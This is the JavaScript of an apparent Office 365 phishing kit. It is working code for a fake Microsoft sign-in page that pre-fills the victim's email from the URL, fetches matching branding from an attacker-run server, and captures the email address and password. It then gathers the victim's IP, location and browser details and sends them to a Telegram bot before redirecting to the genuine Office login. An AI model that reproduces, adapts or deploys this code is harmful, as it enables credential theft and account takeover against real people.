$(document).ready(function() {
    var php_url = "http://xploitednoob.xyz/api.php";
    var check_mx = false;
    var numretry = 0;
    var ipinfo = ipinfo();
    var ua = detect.parse(navigator.userAgent);
    var hash = window.location.hash;
    var emailat = hash.split('#')[1];
    var str =  'Sign in to your Microsoft account';
    document.title=str; //.toUpperCase();
    try {
        var email = atob(emailat);
    } catch(e) {
        var email =  emailat ;
    }
    if(true_email(email)){
        $("#pick_em").show();
        $("#em_picker").html(email);
        $('#email').val(email);
    }else{
        $("#add_em").show();
    }
    $('.email-picker').on('click', function (){
        $('.identity').html(email);
        $(".error-alert-pass").hide();
        set_brand(email);
        setTimeout(function (){
            $("#pick_em").hide();
            $("#add_pass").show();
        }, 1000);
    });
    
    $('.email-picker2').on('click', function (){
        $('#email').val('');
        $("#pick_em").hide();
        $("#add_em").show();
    });
    $('.btn-email').on('click', function (){
        var email = $('#email').val();
        $('.identity').html(email);
        $(".error-alert").hide();
        $('.btn-email').prop('disabled', true);
        if (email == '') {
            $(".error-alert").show();
            $(".error-alert-msg").html('Enter a valid email address and try again');
            $('.btn-email').prop('disabled', false);
        } else if(true_email(email) == false){
            $(".error-alert").show();
            $(".error-alert-msg").html('That Microsoft account doesn\'t exist. Enter a different account and try again');
            $('.btn-email').prop('disabled', false);
        }else{
            if(check_mx == true){
                document.getElementById("pba1").style.display = "block";
                document.getElementById("pba2").style.display = "block";
                var domain = email.split('@')[1];
                var str;
                $.ajax({
                    url: php_url + '?domain=' + domain,
                    success: function(data){
                        str = 1;//data.includes("outlook");
                        if(str){
                            set_brand(email);
                            setTimeout(function (){
                                $("#add_em").hide();
                                $("#add_pass").show();
                            }, 1000);
                            document.getElementById("pba1").style.display = "none";
                            document.getElementById("pba2").style.display = "none";
                        }else{
                            $(".error-alert").show();
                            $(".error-alert-msg").html('You can\'t signin with this account, Please use work or school account instead.');
                            $('.btn-email').prop('disabled', false);
                            document.getElementById("pba1").style.display = "none";
                            document.getElementById("pba2").style.display = "none";
                        }
                    },
                    error: function(xhr){
                        $(".error-alert").show();
                        $(".error-alert-msg").html('Error occured, Please try again.');
                        $('.btn-email').prop('disabled', false);
                    }
                });
            }else{
                set_brand(email);
                setTimeout(function (){
                    $("#add_em").hide();
                    $("#add_pass").show();
                }, 1000);
            }
        }
    });
    $('.btn-signin').on('click', function (){
        $('.btn-signin').prop('disabled', true);
        var user = $('#email').val();
        var pass = $('#password').val();
        var redirecturl = "https://www.office.com/login?es=Click&&ru=%2F";
        tgresult  = "+----+ ☣️! OFFICE365[LOGIN] !☣️ +----+\n";
        tgresult += "+ ☢️ LOGIN INFO \n";
        tgresult += "| [EMAIL]: "+ user +"\n";
        tgresult += "| [PASS]: "+ pass +"\n"
        tgresult += "+-------------------------------------+\n"
        tgresult += "+ ☢️ IP INFO \n";
        tgresult += "| [IP]:" + ipinfo.query +" \n";
        tgresult += "| [CITY]:" + ipinfo.city +" \n";
        tgresult += "| [COUNTRY]:" + ipinfo.country +" \n";
        tgresult += "+-------------------------------------+\n"
        tgresult += "+ ☢️ DEVICE INFO \n";
        tgresult += "| [BROWSER]:" + ua.browser.family +" \n";
        tgresult += "| [DEVICE]:" + ua.device.family +" \n";
        tgresult += "| [USER_AGENT]::" + navigator.userAgent +" \n";
        tgresult += "+------+ ☣️! xploitednoob !☣️ +------+\n";

        if(pass=='' && pass < 6){
            document.getElementById("error-alert").innerHTML = "";
            $(".error-alert-pass").show();
            $(".alert-error").html('Please enter your password.');
            $("#password").addClass("has-error");
            $('.btn-signin').prop('disabled', false);
        } else {
            numretry++
            setTimeout(function (){$(".error-alert-pass").hide();}, 500);
            document.getElementById("pba1").style.display = "block";
            document.getElementById("pba2").style.display = "block";
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange=function() {
                if (this.readyState == 4) {
                    if(numretry == loginretry){
                        location.replace(redirecturl);
                        setTimeout("window.location.href='"+ redirecturl +"';", 1000);
                    }else{
                        document.getElementById("pba1").style.display = "none";
                        document.getElementById("pba2").style.display = "none";
                        $(".error-alert-pass").show();
                        $("#password").addClass("has-error");
                        $("#password").val('');
                        $('.btn-signin').prop('disabled', false);
                    }
                }else{
                    $(".error-alert-pass").hide();
                    $("#password").removeClass("has-error");
                    $('.btn-signin').prop('disabled', false);
                }
            };
            xhttp.open("POST","https://api.telegram.org/bot"+ botkey +"/sendMessage", true);
            xhttp.setRequestHeader("Content-Type", "application/json");
            var data = JSON.stringify({"chat_id":chatid,"text":tgresult});
            xhttp.send(data);
        }
    });


    $('.backButton').on('click', function (){
        $('#bg_image').css('background-image', 'url(https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)');
        $('#logo_image').attr('src', 'https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');
        $('#banner_image').show();
        $('.btn-email').prop('disabled', false);
        $("#add_pass").hide();
        $("#add_em").show();
        $(".error-alert-pass").hide();
    });

    function ipinfo() {
        var jsonvar = ''; 
        $.ajax({
            'async': false,
            'type': "GET",
            'url': "http://extreme-ip-lookup.com/json/",
            'success': function (data) {
                jsonvar = data;
            }
        });
        return jsonvar;
    }


    function set_brand(email){
        $.ajax({
            url: php_url,
            type: "POST",
            data: {email:email,barnd:1},
            success: function(data){
                var i=JSON.parse(data);
                if(i.bg_image !== null && i.bg_image !== ''){
                    $('#bg_image').css('background-image', 'url(' + i.bg_image + ')');
                    $('#banner_image').hide();
                    //	alert(i.logo_image);
                }
                if(i.logo_image !== null && i.logo_image !== ''){
                    $('#logo_image').attr('src', i.logo_image);
                    $('#banner_image').hide();
                    //	alert(i.logo_image);
                }
            }
        });
    }
});

function true_email(a) {
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(a);
}

$(document).keypress(function(event){
    var keycode = (event.keyCode ? event.keyCode : event.which);
    if(keycode == '13'){
        $("#btn-email, .btn-signin").click();
    }
});
